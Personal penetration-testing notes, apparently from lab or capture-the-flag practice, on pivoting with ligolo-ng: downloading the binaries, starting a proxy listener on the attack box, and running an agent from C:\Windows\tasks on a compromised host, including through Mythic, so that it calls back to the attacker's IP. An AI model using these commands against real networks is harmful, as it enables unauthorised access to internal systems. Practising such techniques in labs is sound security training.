//TODO: UPDATE ESPANSO TO USE MODERN LIGOLO WINDOWS AGENT, LINUX AGENT, AND LINUX SERVER

Ligolo is used for pivoting. We can install it with the below commands, and rename it to make the names more obvious

```bash
# Get windows agent, extract it, and rename it
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_windows_amd64.zip && unzip ligolo-ng_agent_0.8.2_windows_amd64.zip && mv agent.exe ligolo-windows-agent.exe && rm *.zip && rm *.md && rm LICENSE

# Get the Linux Proxy Server, Extract it, and rename it
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz && tar -xvf ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz && mv proxy ligolo-proxy-server && rm *.gz && rm *.md && rm LICENSE


# Get the Linux Agent, Extract it, and rename it
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_linux_amd64.tar.gz && tar -xvf ligolo-ng_agent_0.8.2_linux_amd64.tar.gz && mv agent ligolo-linux-agent && rm *.gz && rm *.md && rm LICENSE

```

There's two parts: a proxy server running on our attack machine, and agents running on compromised machines. The agents will call back to the attacking machine's proxy server.

We can setup our proxy server like so, to add the ligolo interface, set it up, and then run the proxy server, which will listen on port 443 for connections.
```bash
sudo ip tuntap add user kali mode tun ligolo ; sudo ip link set ligolo up && sudo ./ligolo-proxy-server -selfcert -laddr 0.0.0.0:443


```

We can run the agent (after uploading it) with
```cmd
C:\Windows\tasks\ligolo-windows-agent.exe -connect 10.10.16.157:443 -ignore-cert
```
If we're in Mythic, we can use
```
run -Executable C:\Windows\tasks\ligolo-windows-agent.exe -Arguments "-connect 10.10.16.157:443 -ignore-cert"
```

## Autoroute
We need to add the internal IP range so that it gets routed. We can use autoroute for this
```bash
sessions
1
autoroute

# Check range is valid
# Add a new interface
# Then start the tunnel

```